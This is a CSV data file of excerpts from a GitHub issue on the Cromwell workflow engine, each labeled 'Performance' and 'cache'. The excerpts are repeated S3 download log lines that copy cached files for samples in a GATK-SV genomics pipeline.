Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz; 1608597111201,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz; 1608597112463,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz.tbi; 1608597115454,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:47447,cache,cacheCopy,47447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz; 1608597327069,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz; 1608597328928,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi; 1608597331137,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:106033,cache,cacheCopy,106033,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-128/cacheCopy/SR00c.NA19350.txt.gz.tbi; 1608597189769,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz; 1608597192326,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz; 1608597194778,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:69254,cache,cacheCopy,69254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-13/cacheCopy/SR00c.HG00457.txt.gz.tbi; 1608597149087,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-16/cacheCopy/SR00c.HG00625.txt.gz; 1608597152166,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz; 1608597154187,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-82/cacheCopy/SR00c.HG03472.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:58053,cache,cacheCopy,58053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz; 1608597001436,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz; 1608597003743,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi; 1608597005866,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerg",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:18150,cache,cacheCopy,18150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz.tbi; 1608597320422,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz; 1608597322033,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi; 1608597324182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:104163,cache,cacheCopy,104163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz; 1608597411470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz; 1608597413700,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz.tbi; 1608597415362,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:129116,cache,cacheCopy,129116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi; 1608597315649,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz; 1608597317794,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz.tbi; 1608597320422,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:102917,cache,cacheCopy,102917,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz.tbi; 1608597622374,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz; 1608597624684,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz; 1608597626312,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:189184,cache,cacheCopy,189184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi; 1608597432512,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-98/cacheCopy/SR00c.HG03888.txt.gz; 1608597434353,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-26/cacheCopy/SR00c.HG01356.txt.gz.tbi; 1608597435583,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:135361,cache,cacheCopy,135361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi; 1608597442529,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz; 1608597443863,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz.tbi; 1608597446991,download: 